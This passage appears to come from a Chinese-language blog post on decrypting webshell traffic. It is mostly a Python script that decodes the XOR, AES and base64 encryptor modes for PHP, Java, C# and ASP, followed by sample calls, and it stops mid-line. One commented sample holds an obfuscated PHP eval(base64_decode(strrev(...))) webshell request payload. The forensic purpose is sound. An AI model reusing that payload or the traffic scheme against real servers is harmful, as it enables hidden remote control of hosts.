<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F0aaced4f-8de3-4eba-a0f3-eefd8db6b54e%2FUntitled.png?table=block&id=0d27e5c8-dd81-4d79-89ef-c46ce6677e5b&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1410&userId=&cache=v2" alt="Untitled"></p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fcfdce14c-1909-46d4-af25-b2683e7de8fb%2FUntitled.png?table=block&id=8e7585ff-a007-441e-885d-bc9f3a1d3eef&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1360&userId=&cache=v2" alt="Untitled"></p>
<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>可以采用脚本解密</p>
<p>之前我们使用的加密体是php_eval_xor_base64，因此请求体的构成为明文可执行代码+加密数据，在脚本内找到对应的解密模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import gzip</span><br><span class="line">import re</span><br><span class="line">from urllib.parse import unquote</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def unpad(s):</span><br><span class="line">    return s[:-ord(s[len(s) - 1:])]</span><br><span class="line"></span><br><span class="line">def XOR(D, K):</span><br><span class="line">    result = []</span><br><span class="line">    for i in range(len(D)):</span><br><span class="line">        c = K[i + 1 &amp; 15]</span><br><span class="line">        if not isinstance(D[i], int):</span><br><span class="line">            d = ord(D[i])</span><br><span class="line">        else:</span><br><span class="line">            d = D[i]</span><br><span class="line">        result.append(d ^ ord(c))</span><br><span class="line">    return b&#x27;&#x27;.join([i.to_bytes(1, byteorder=&#x27;big&#x27;) for i in result])</span><br><span class="line"></span><br><span class="line">class PHP_XOR_BASE64:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class="line">        return XOR(base64.b64decode(unquote(payload)), self.key)</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        payload = payload[16:-16]</span><br><span class="line">        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))</span><br><span class="line"></span><br><span class="line">class PHP_XOR_RAW:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        return XOR(payload, self.key)</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        return gzip.decompress(XOR(payload, self.key))</span><br><span class="line"></span><br><span class="line">class PHP_EVAL_XOR_BASE64:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        body = unquote(payload.decode())</span><br><span class="line">        match = re.findall(r&quot;eval\(base64_decode\(strrev\(urldecode\(&#x27;(.*)&#x27;\)&quot;, str(body))</span><br><span class="line">        # encode_body = regexphp(,body)</span><br><span class="line">        tmp = reversed(match[0])</span><br><span class="line">        tmp_base64 = &#x27;&#x27;.join(tmp)</span><br><span class="line">        return base64.b64decode(tmp_base64)</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        payload = payload[16:-16]</span><br><span class="line">        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))</span><br><span class="line"></span><br><span class="line">class JAVA_AES_BASE64:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class="line">        encrypted_text = base64.b64decode(unquote(payload))</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class="line">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">        decrypted_text = unpad(decrypted_text)</span><br><span class="line">        try:</span><br><span class="line">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        return decrypted_text</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        payload = payload.decode()</span><br><span class="line">        payload = payload[16:-16]</span><br><span class="line">        encrypted_text = base64.b64decode(payload)</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class="line">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">        decrypted_text = unpad(decrypted_text)</span><br><span class="line">        return gzip.decompress(decrypted_text)</span><br><span class="line"></span><br><span class="line">class JAVA_AES_RAW:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        &quot;&quot;&quot;&quot;16进制字符串: d26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60&quot;&quot;&quot;</span><br><span class="line">        encrypted_text = payload</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class="line">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">        decrypted_text = unpad(decrypted_text)</span><br><span class="line">        try:</span><br><span class="line">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        return decrypted_text</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        encrypted_text = payload</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class="line">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">        decrypted_text = unpad(decrypted_text)</span><br><span class="line">        return gzip.decompress(decrypted_text)</span><br><span class="line"></span><br><span class="line">class CSHAP_AES_BASE64:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class="line">        encrypted_text = base64.b64decode(unquote(payload))</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class="line">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">        decrypted_text = unpad(decrypted_text)</span><br><span class="line">        try:</span><br><span class="line">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        return decrypted_text</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        payload = payload.decode()</span><br><span class="line">        payload = payload[16:-16]</span><br><span class="line">        encrypted_text = base64.b64decode(payload)</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class="line">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">        decrypted_text = unpad(decrypted_text)</span><br><span class="line">        return gzip.decompress(decrypted_text)</span><br><span class="line"></span><br><span class="line">class CSHAP_EVAL_AES_BASE64:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        body = unquote(payload.decode())</span><br><span class="line">        match = re.findall(r&quot;HttpUtility.UrlDecode\(&#x27;(.*)&#x27;\)\)\)&quot;, str(body))</span><br><span class="line">        tmp = match[0]</span><br><span class="line">        decrypted_text = base64.b64decode(tmp)</span><br><span class="line"></span><br><span class="line">        return decrypted_text</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        payload = payload.decode()</span><br><span class="line">        payload = payload[16:-16]</span><br><span class="line">        encrypted_text = base64.b64decode(payload)</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class="line">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">        decrypted_text = unpad(decrypted_text)</span><br><span class="line">        return gzip.decompress(decrypted_text)</span><br><span class="line"></span><br><span class="line">class CSHAP_ASMX_AES_BASE64:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        body = payload.decode()</span><br><span class="line">        match = re.findall(r&quot;&lt;&#123;&#125;&gt;(.*?)&lt;/&#123;&#125;&gt;&quot;.format(self.pass_, self.pass_), str(body))</span><br><span class="line"></span><br><span class="line">        encrypted_text = base64.b64decode(unquote(match[0]))</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class="line">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">        decrypted_text = unpad(decrypted_text)</span><br><span class="line">        try:</span><br><span class="line">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        return decrypted_text</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        body = payload.decode()</span><br><span class="line">        match = re.findall(r&quot;&lt;&#123;&#125;Result&gt;(.*?)&lt;/&#123;&#125;Result&gt;&quot;.format(self.pass_, self.pass_), str(body))</span><br><span class="line"></span><br><span class="line">        payload = match[0][16:-16]</span><br><span class="line">        encrypted_text = base64.b64decode(payload)</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class="line">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">        decrypted_text = unpad(decrypted_text)</span><br><span class="line">        return gzip.decompress(decrypted_text)</span><br><span class="line"></span><br><span class="line">class CSHAP_AES_RAW:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        encrypted_text = payload</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class="line">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">        decrypted_text = unpad(decrypted_text)</span><br><span class="line">        try:</span><br><span class="line">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        return decrypted_text</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        encrypted_text = payload</span><br><span class="line"></span><br><span class="line">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class="line">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class="line">        decrypted_text = unpad(decrypted_text)</span><br><span class="line">        return gzip.decompress(decrypted_text)</span><br><span class="line"></span><br><span class="line">class ASP_BASE64:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class="line">        return base64.b64decode(unquote(payload))</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        payload = payload.decode()</span><br><span class="line">        payload = payload[6:-6]</span><br><span class="line">        return base64.b64decode((payload))</span><br><span class="line"></span><br><span class="line">class ASP_EVAL_BASE64:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        body = unquote(payload.decode())</span><br><span class="line">        match = re.findall(r&#x27;bd\(&quot;&quot;&quot;&quot;(.*?)&quot;&quot;&quot;&quot;\)&#x27;, str(body))</span><br><span class="line">        tmp = bytes(bytearray.fromhex(match[0]))</span><br><span class="line">        return tmp</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        payload = payload[6:-6]</span><br><span class="line">        return base64.b64decode((payload))</span><br><span class="line"></span><br><span class="line">class ASP_RAW:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        return payload</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        return payload</span><br><span class="line"></span><br><span class="line">class ASP_XOR_BASE64:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class="line">        return XOR(base64.b64decode(unquote(payload)), self.key)</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        payload = payload.decode()</span><br><span class="line">        payload = payload[6:-6]</span><br><span class="line">        return XOR(base64.b64decode(payload), self.key)</span><br><span class="line"></span><br><span class="line">class ASP_XOR_RAW:</span><br><span class="line">    def __init__(self, pass_, key):</span><br><span class="line">        self.pass_ = pass_</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    def decrypt_req_payload(self, payload):</span><br><span class="line">        return XOR(payload, self.key)</span><br><span class="line"></span><br><span class="line">    def decrypt_res_payload(self, payload):</span><br><span class="line">        return XOR(payload, self.key)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    decrypter = PHP_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    data = decrypter.decrypt_req_payload(b&#x27;pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ==&#x27;)</span><br><span class="line">    print(data)</span><br><span class="line">    data = decrypter.decrypt_res_payload(b&#x27;72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488&#x27;)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    # php_xor_raw_req = &#x27;0e5311580d5c2f580e54373632346147064511&#x27;</span><br><span class="line">    # php_xor_raw_res = &#x27;7cbd6d3062386139633bfefd343426eebf4f67306238&#x27;</span><br><span class="line">    # decrypter = PHP_XOR_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(php_xor_raw_req)))</span><br><span class="line">    # print(data)</span><br><span class="line">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(php_xor_raw_res)))</span><br><span class="line">    # print(data)</span><br><span class="line"></span><br><span class="line">    # decrypter = PHP_EVAL_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    # data = decrypter.decrypt_req_payload(b&#x27;pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&amp;key=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D&#x27;)</span><br><span class="line">    # print(data)</span><br><span class="line">    # exit()</span><br><span class="line">    # data = decrypter.decrypt_res_payload(b&#x27;72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488&#x27;)</span><br><span class="line">    # print(data)</span><br><span class="line"></span><br><span class="line">    # decrypter = JAVA_AES_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    # java_raw_req = &#x27;d26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60&#x27;</span><br><span class="line">    # java_raw_res = &#x27;2c5fc8a643ef334889238c26a41b360daa0156f71b0cca70b8bee7612de7fe4e&#x27;</span><br><span class="line">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(java_raw_req)))</span><br><span class="line">    # print(data)</span><br><span class="line">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(java_raw_res)))</span><br><span class="line">    # print(data)</span><br><span class="line"></span><br><span class="line">    decrypter = JAVA_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    data = decrypter.decrypt_req_payload(b&#x27;pass=0mQU%2BS1pFnTz3ttVTnAgJVD%2FaBwD3NNXL3TfTExo1weKu4KAhhCu6Gn1EQfX1m9g&#x27;)</span><br><span class="line">    print(data)</span><br><span class="line">    data = decrypter.decrypt_res_payload(</span><br><span class="line">        b&#x27;11CD6A8758984163LF/IpkPvM0iJI4wmpBs2DaoBVvcbDMpwuL7nYS3n/k4=6C37AC826A2A04BC&#x27;)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    decrypter = ASP_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    data = decrypter.decrypt_req_payload(b&quot;pass=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D&quot;)</span><br><span class="line">    print(data)</span><br><span class="line">    data = decrypter.decrypt_res_payload(b&quot;11cd6ab2s=ac826a&quot;)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    decrypter = ASP_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    data = decrypter.decrypt_req_payload(b&quot;methodName\x02\x04\x00\x00\x00test&quot;)</span><br><span class="line">    print(data)</span><br><span class="line">    data = decrypter.decrypt_res_payload(b&quot;ok&quot;)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    decrypter = ASP_EVAL_BASE64(pass_=&#x27;pass&#x27;, 